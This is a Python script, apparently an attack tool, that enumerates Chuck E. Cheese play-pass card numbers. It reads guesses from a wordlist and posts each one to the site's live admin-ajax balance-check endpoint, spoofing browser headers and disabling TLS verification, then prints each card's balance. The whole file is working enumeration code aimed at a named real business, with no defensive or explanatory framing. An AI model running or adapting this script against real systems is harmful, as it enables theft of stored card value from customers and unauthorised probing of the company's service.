import requests
import argparse
import urllib3

parser = argparse.ArgumentParser(description='Wordlist of UID\'s')
parser.add_argument('--wordlist', type=str, help='Add Wordlist')
args = parser.parse_args()


#Burpsuite intercept -- Add proxies=proxies into check if you want to use
#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Remove annoying warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

uid = ''
balance = ''


headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36', 
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Accept': 'application/json, text/javascript, */*; q=0.01',
'X-Requested-With': 'XMLHttpRequest',
'Sec-Ch-Ua-Platform': "macOS",
'Origin': 'https://www.chuckecheese.com',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Dest': 'empty',
'Referer': 'https://www.chuckecheese.com/plan-your-visit/play-pass/',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'en-US,en;q=0.9'
}


def tokens():
    if args.wordlist:
	    with open(args.wordlist, 'r') as fh:
		    for uid in fh:
                        data = {'action':'check_card_balance','card_no': uid.strip()}
                        response = requests.post('https://www.chuckecheese.com/wp-admin/admin-ajax.php', headers=headers, data=data, verify=False)
                        balance = (response.text[24:25])
                        print(uid.strip(), end=': ' + "Balance:" + response.text[32:34] + '\n')

tokens()
